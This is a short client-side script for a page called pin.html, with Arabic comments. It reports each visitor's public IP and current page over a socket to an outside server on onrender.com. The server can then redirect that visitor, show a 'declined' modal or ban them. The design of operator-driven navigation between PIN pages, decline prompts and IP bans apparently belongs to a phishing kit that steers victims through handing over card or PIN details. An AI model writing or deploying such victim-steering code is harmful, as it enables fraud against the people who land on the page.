    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const { ip } = await r.json();
        window.visitorIP = ip;
        window.socket.emit("updateLocation", { ip, page: "pin.html" });
      } catch(e) { console.error("IP fetch failed:", e); }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
      if (window.visitorIP === targetIp) {
        window.location.href = page;
      }
    });

    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        
        // فحص الرفض في الرابط الحالي
        const params = new URLSearchParams(window.location.search);
        if (params.get("declined") === "true") {
          // استدعاء وظيفة الرفض إذا كانت موجودة (موجودة في pin2.js)
          if (typeof showDeclineModal === "function") {
            showDeclineModal();
          } else {
            // انتظار تحميل pin2.js لو لزم الأمر
            const t = setInterval(() => {
              if (typeof showDeclineModal === "function") {
                clearInterval(t);
                showDeclineModal();
              }
            }, 100);
          }
        }

        const res = await fetch(`https://dallah-server-xpls.onrender.com/api/pending-nav/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.page && !window.location.href.includes(data.page)) { 
          window.location.href = data.page; 
        }
      } catch(e) { console.error("pending-nav check failed:", e); }
    })();

    
    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        const res = await fetch(`https://dallah-server-xpls.onrender.com/api/banned/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.banned) { window.location.replace("banned.html"); }
      } catch(e) { console.error("ban check failed:", e); }
    })();

    
    window.socket.on("banned", () => {
      window.location.replace("banned.html");
    });